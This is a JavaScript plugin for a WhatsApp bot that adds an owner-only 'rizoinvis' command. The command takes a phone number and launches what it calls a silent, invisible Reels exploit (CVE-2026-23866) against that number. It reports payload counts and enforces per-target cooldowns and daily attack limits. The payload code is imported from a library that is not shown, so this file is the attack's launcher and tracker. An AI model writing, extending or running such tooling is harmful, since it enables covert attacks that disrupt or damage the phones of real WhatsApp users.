// plugins/rizoinvis.js
const { cmd } = require('../arslan');
const { Rizoinvis, CONFIG } = require('../lib/rizoinvis');
const guard = require('../lib/rizoinvis_guard');

cmd({
    pattern: 'rizoinvis',
    alias: ['ri', 'invis', 'rizoinvisible', 'rizoinv'],
    desc: 'RIZOINVIS — silent invisible Reels exploit (CVE-2026-23866, owner only)',
    category: 'owner',
    react: '👁️',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, body, args, pushname, isCreator, reply }) => {
    try {
        if (!isCreator) {
            return reply('🔒 *Owner Only — RIZOINVIS Command!*');
        }

        if (!args[0]) {
            return reply(
`📌 *Usage:* .rizoinvis 923xxxxxxxxx

📖 *Example:* .rizoinvis 923001234567

👁️ RIZOINVIS Attack
🎯 CVE-2026-23866 Reels exploit
🔇 Silent + Invisible
🛡 Self-protection active
⏳ 72h per-target cooldown
📊 Daily limit: 2`
            );
        }

        const targetNumber = (args[0] || '').replace(/[^0-9]/g, '');

        if (!targetNumber || targetNumber.length < 10) {
            return reply('❌ *Invalid number format!*');
        }

        const botNum = String(conn.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
        const check = guard.checkTarget(targetNumber, botNum);

        if (!check.ok) {
            return reply(
`${check.msg}

🚫 Target: \`${targetNumber}\`
📋 Reason: \`${check.reason}\``
            );
        }

        const targetJid = targetNumber + '@s.whatsapp.net';

        await reply(
`👁️ *RIZOINVIS LOCKED*
📱 Target : \`${targetNumber}\`
🎯 Vector : CVE-2026-23866 Reels
🔇 Silent  : ON
👻 Invisible: ON
🎭 Disguise: ${CONFIG.DISGUISE ? 'ON' : 'OFF'}
🛡 Self-guard: active
⚡ Launching...`
        );

        let lastPct = 0;
        const result = await Rizoinvis(conn, targetJid, (sent, total, type) => {
            const pct = Math.floor((sent / total) * 100);
            if (pct >= lastPct + 25) {
                lastPct = pct;
                conn.sendMessage(from, {
                    text: `⏳ RIZOINVIS ${pct}% — last: *${type}* (${sent}/${total})`
                }).catch(() => {});
            }
        });

        if (result.ok) {
            guard.recordAttack(targetNumber, 'success');

            await conn.sendMessage(from, {
                react: { text: '👁️', key: mek.key }
            });

            const stats = guard.getStats();
            return reply(
`✅ *RIZOINVIS COMPLETE*
🎯 Target : \`${targetNumber}\`
📤 Sent   : \`${result.sent}\` payloads
🎯 Vector : Reels + Rich
🕒 ${new Date().toLocaleString()}

📊 Today : ${stats.todayCount}/${stats.dailyLimit}
⏳ Next attack in 90 min (global)`
            );
        } else {
            guard.recordAttack(targetNumber, 'failed:' + result.error);
            return reply(`⚠️ *Partial failure:* ${result.error}`);
        }

    } catch (err) {
        console.log('RIZOINVIS ERROR:', err);
        return reply(`❌ *RIZOINVIS ERROR*\n\n${err.message}`);
    }
});